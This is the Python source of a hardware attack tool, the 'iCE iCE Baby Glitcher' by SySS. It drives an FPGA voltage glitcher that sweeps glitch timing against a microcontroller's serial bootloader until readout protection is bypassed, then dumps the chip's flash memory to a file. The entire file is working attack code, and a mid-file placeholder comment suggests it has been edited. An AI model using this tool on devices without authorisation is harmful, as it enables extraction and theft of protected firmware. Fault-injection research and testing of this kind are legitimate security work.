#!/usr/bin/env python
# -*- conding: utf-8 -*-

"""
  iCE, iCE Baby Glitcher

  by Matthias Deeg (@matthiasdeeg, matthias.deeg@syss.de)

  Command tool for a simple FPGA-based voltage glitcher using a
  Lattice Semiconductor iCEstick Evaluation Kit or an iCEBreaker FPGA

  This glitcher is based on and inspired by glitcher implementations
  by Dmitry Nedospasov (@nedos) from Toothless Consulting and
  Grazfather (@Grazfather)

  References:
    http://www.latticesemi.com/icestick
    https://www.crowdsupply.com/1bitsquared/icebreaker-fpga
    https://github.com/toothlessco/arty-glitcher
    https://toothless.co/blog/bootloader-bypass-part1/
    https://toothless.co/blog/bootloader-bypass-part2/
    https://toothless.co/blog/bootloader-bypass-part3/
    https://github.com/Grazfather/glitcher
    http://grazfather.github.io/re/pwn/electronics/fpga/2019/12/08/Glitcher.html

  Copyright 2020, Matthias Deeg, SySS GmbH

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  1. Redistributions of source code must retain the above copyright notice,
     this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright notice,
     this list of conditions and the following disclaimer in the documentation
     and/or other materials provided with the distribution.

  3. Neither the name of the copyright holder nor the names of its contributors
     may be used to endorse or promote products derived from this software
     without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE.
"""

__version__ = '0.5'
__author__ = 'Matthias Deeg'

import argparse

from binascii import hexlify
from codecs import decode
from datetime import datetime
from pylibftdi import Device, INTERFACE_B
from struct import pack
from sty import fg, ef
from time import sleep

# some definitions
CRLF = b"\r\n"
SYNCHRONIZED = b"Synchronized"
OK = b"OK"
READ_FLASH_CHECK = b"R 0 4"
CRYSTAL_FREQ = b"10000" + CRLF
MAX_BYTES = 20
UART_TIMEOUT = 5
DUMP_FILE = "memory.dump"
RESULTS_FILE = "results.txt"

# FPGA commands for iCEstick voltage glitcher
CMD_PASSTHROUGH     = b"\x00"
CMD_RESET           = b"\x01"
CMD_SET_DURATION    = b"\x02"
CMD_SET_OFFSET      = b"\x03"
CMD_START_GLITCH    = b"\x04"


class Glitcher():
    def __init__(self, start_offset=0, end_offset=5000, offset_step=1,
            duration_step=1, start_duration=1, end_duration=30, retries=2):
        self.dev = Device(mode='b', interface_select=INTERFACE_B)
        self.dev.baudrate = 115200
        self.offset_step = offset_step
        self.duration_step = duration_step
        self.start_offset = start_offset
        self.end_offset = end_offset
        self.start_duration = start_duration
        self.end_duration = end_duration
        self.retries = retries

    def read_data(self, terminator=b"\r\n", echo=True):
        if echo:
            c = b"\x00"
            while c != b"\r":
                c = self.dev.read(1)

        data = b""
        while True:
            c = self.dev.read(1)
            if not c:
                return "UART_TIMEOUT"
            data += c
            if data.endswith(terminator):
                break

        return data.replace(terminator, b"")

    def synchronize(self):
        print("[DEBUG] sending '?' as 0x3F")
        data = CMD_PASSTHROUGH + pack("B", 1) + b"\x3F"
        self.dev.write(data)

        resp = self.read_data(echo=False)
        print("[DEBUG] got sync response:", repr(resp))
        if resp != SYNCHRONIZED:
            return False

        print("[DEBUG] sending 'Synchronized\\r\\n'")
        cmd = SYNCHRONIZED + CRLF
        data = CMD_PASSTHROUGH + pack("B", len(cmd)) + cmd
        self.dev.write(data)

        resp = self.read_data()
        print("[DEBUG] got 'OK' response:", repr(resp))
        if resp != OK:
            print("[WARN] No OK received, trying to continue anyway...")
            return True

        print("[DEBUG] sending clock")
        self.dev.write(CMD_PASSTHROUGH + b"\x07" + CRYSTAL_FREQ)

        resp = self.read_data()
        print("[DEBUG] got clock response:", repr(resp))
        if resp != OK:
            print("[WARN] No OK after crystal freq, trying to continue anyway...")
            return True

        return True

    # ... the rest of the code remains unchanged ...

    def read_command_response(self, response_count, echo=True, terminator=b"\r\n"):
        """Read command response from target device"""
        print("[DEBUG] read_command_response start, expecting {} response(s)".format(response_count))
        result = []
        data = b""

        # if echo is on, read the sent back ISP command before the actual response
        count = 0
        if echo:
            c = b"\x00"
            while c != b"\r":
                count += 1
                c = self.dev.read(1)

                if count > MAX_BYTES:
                    return "TIMEOUT"

        # read return code
        data = b""
        old_len = 0
        count = 0
        while True:
            data += self.dev.read(1)

            # if data[len(terminator) * -1:] == terminator:
            if data[-2:] == terminator:
                break

            if len(data) == old_len:
                count += 1

                if count > MAX_BYTES:
                    return "TIMEOUT"
            else:
                old_len = len(data)

        # add return code to result
        return_code = data.replace(CRLF, b"")
        result.append(return_code)
        print("[DEBUG] Return code received:", return_code)
        # check return code and return immediately if it is not "CMD_SUCCESS"
        if return_code != b"0":
            return result

        # read specified number of responses
        for i in range(response_count):
            data = b""
            count = 0
            old_len = 0
            while True:
                data += self.dev.read(1)
                if data[-2:] == terminator:
                    break

                if len(data) == old_len:
                    count += 1

                    if count > MAX_BYTES:
                        return "TIMEOUT"
                else:
                    old_len = len(data)

            # add response to result
            result.append(data.replace(CRLF, b""))

        return result

    def send_target_command(self, command, response_count=0, echo=True, terminator=b"\r\n"):
        """Send command to target device"""
        print("[DEBUG] Sending command:", command)
        # send command
        cmd = command + b"\x0d"
        data = CMD_PASSTHROUGH + pack("B", len(cmd)) + cmd
        self.dev.write(data)

        # read response
        resp = self.read_command_response(response_count, echo, terminator)

        return resp

    def reset_target(self):
        """Reset target device"""

        # send command
        self.dev.write(CMD_RESET)

    def set_glitch_duration(self, duration):
        """Send config command to set glitch duration in FPGA clock cycles"""

        # send command
        data = CMD_SET_DURATION + pack("<L", duration)
        self.dev.write(data)

    def set_glitch_offset(self, offset):
        """Send config command to set glitch offset in FPGA clock cycles"""

        # send command
        data = CMD_SET_OFFSET + pack("<L", offset)
        self.dev.write(data)

    def start_glitch(self):
        """Start glitch (actually start the offset counter)"""

        # send command
        self.dev.write(CMD_START_GLITCH)

    def dump_memory(self):
        """Dump the target device memory"""

        # dump the 32 kB flash memory and save the content to a file
        with open(DUMP_FILE, "wb") as f:

            # read all 32 kB of flash memory
            for i in range(1023):
                # first send "OK" to the target device
                resp = self.send_target_command(OK, 1, True, b"\r\n")

                # then a read command for 32 bytes
                cmd = "R {} 32".format(i * 32).encode("utf-8")
                resp = self.send_target_command(cmd, 1, True, b"\r\n")

                if resp[0] == b"0":
                    # read and decode uu-encodod data in a somewhat "hacky" way
                    data = b"begin 666 <data>\n" + resp[1] + b" \n \nend\n"
                    raw_data = decode(data, "uu")
                    print(fg.li_blue + bytes.hex(raw_data) + fg.rs)
                    f.write(raw_data)

        print(fg.li_white + "[*] Dumped memory written to '{}'".format(DUMP_FILE) + fg.rs)
      
    def run(self):
            start_time = datetime.now()
            last_progress_time = start_time
            offset = self.start_offset
    
            while offset < self.end_offset:
                duration_loop_broken = False
                for duration in range(self.start_duration, self.end_duration, self.duration_step):
                    for i in range(self.retries):
                        now = datetime.now()
                        if (now - last_progress_time).total_seconds() > 5:
                            print(fg.red + f"[!] Timeout detected at offset={offset}. Rolling back 5..." + fg.rs)
                            offset = max(offset - 5, self.start_offset)
                            duration_loop_broken = True
                            break
    
                        print(fg.li_white + "[*] Set glitch configuration ({},{})".format(offset, duration) + fg.rs)
                        self.set_glitch_offset(offset)
                        self.set_glitch_duration(duration)
                        self.start_glitch()
                        self.reset_target()
    
                        if not self.synchronize():
                            print(fg.li_red + "[-] Error during sychronisation" + fg.rs)
                            continue
    
                        last_progress_time = datetime.now()
                        resp = self.send_target_command(READ_FLASH_CHECK, 1, True, b"\r\n")
    
                        if resp[0] == b"0":
                            end_time = datetime.now()
                            print(ef.bold + fg.green + "[*] Glitching success!\n"
                                  "    Bypassed the readout protection with the following glitch parameters:\n"
                                  "        offset   = {}\n        duration = {}\n".format(offset, duration) +
                                  "    Time to find this glitch: {}".format(end_time - start_time) + fg.rs)
                            config = "{},{},{},{}\n".format(offset, duration, resp[0], resp[1])
                            with open(RESULTS_FILE, "a") as f:
                                f.write(config)
                            print(fg.li_white + "[*] Dumping the flash memory ..." + fg.rs)
                            self.dump_memory()
                            return True
    
                        elif resp[0] != b"19":
                            print(fg.li_red + "[?] Unexpected response: {}".format(resp) + fg.rs)
    
                    if duration_loop_broken:
                        break
    
                offset += self.offset_step
    
            return False



def banner():
    """Show a fancy banner"""

    print(fg.li_white + "\n" +
""" ██▓ ▄████▄  ▓█████     ██▓ ▄████▄  ▓█████     ▄▄▄▄    ▄▄▄       ▄▄▄▄ ▓██   ██▓     ▄████  ██▓     ██▓▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  \n"""
"""▓██▒▒██▀ ▀█  ▓█   ▀    ▓██▒▒██▀ ▀█  ▓█   ▀    ▓█████▄ ▒████▄    ▓█████▄▒██  ██▒    ██▒ ▀█▒▓██▒    ▓██▒▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒\n"""
"""▒██▒▒▓█    ▄ ▒███      ▒██▒▒▓█    ▄ ▒███      ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██ ██░   ▒██░▄▄▄░▒██░    ▒██▒▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒\n"""
"""░██░▒▓▓▄ ▄██▒▒▓█  ▄    ░██░▒▓▓▄ ▄██▒▒▓█  ▄    ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░   ░▓█  ██▓▒██░    ░██░░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  \n"""
"""░██░▒ ▓███▀ ░░▒████▒   ░██░▒ ▓███▀ ░░▒████▒   ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░   ░▒▓███▀▒░██████▒░██░  ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒\n"""
"""░▓  ░ ░▒ ▒  ░░░ ▒░ ░   ░▓  ░ ░▒ ▒  ░░░ ▒░ ░   ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒     ░▒   ▒ ░ ▒░▓  ░░▓    ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░\n"""
""" ▒ ░  ░  ▒    ░ ░  ░    ▒ ░  ░  ▒    ░ ░  ░   ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░▓██ ░▒░      ░   ░ ░ ░ ▒  ░ ▒ ░    ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░\n"""
""" ▒ ░░           ░       ▒ ░░           ░       ░    ░   ░   ▒    ░    ░▒ ▒ ░░     ░ ░   ░   ░ ░    ▒ ░  ░      ░         ░  ░░ ░   ░     ░░   ░ \n"""
""" ░  ░ ░         ░  ░    ░  ░ ░         ░  ░    ░            ░  ░ ░     ░ ░              ░     ░  ░ ░           ░ ░       ░  ░  ░   ░  ░   ░     \n"""
"""    ░                      ░                        ░                 ░░ ░                                     ░                                \n"""
"""iCE iCE Baby Glitcher v{0} by Matthias Deeg - SySS GmbH\n""".format(__version__) + fg.white +
"""A very simple voltage glitcher implementation for the Lattice iCEstick Evaluation Kit\n"""
"""Based on and inspired by voltage glitcher implementations by Dmitry Nedospasov (@nedos)\n"""
"""and Grazfather (@Grazfather)\n---""" + fg.rs)


# main program
if __name__ == '__main__':
    # show banner
    banner()

    # init command line parser
    parser = argparse.ArgumentParser("./glitcher.py")
    parser.add_argument('--start_offset', type=int, default=100, help='start offset for glitch (default is 100)')
    parser.add_argument('--end_offset', type=int, default=10000, help='end offset for glitch (default is 10000)')
    parser.add_argument('--start_duration', type=int, default=1, help='start duration for glitch (default is 1)')
    parser.add_argument('--end_duration', type=int, default=30, help='end duration for glitch (default is 30)')
    parser.add_argument('--offset_step', type=int, default=1, help='offset step (default is 1)')
    parser.add_argument('--duration_step', type=int,default=1, help='duration step (default is 1)')
    parser.add_argument('--retries', type=int,default=2, help='number of retries per configuration (default is 2)')

    # parse command line arguments
    args = parser.parse_args()

    # create a glitcher
    glitcher = Glitcher(start_offset=args.start_offset,
            end_offset=args.end_offset,
            start_duration=args.start_duration,
            end_duration=args.end_duration,
            offset_step=args.offset_step,
            duration_step=args.duration_step,
            retries=args.retries)

    # run the glitcher with specified start parameters
    glitcher.run()
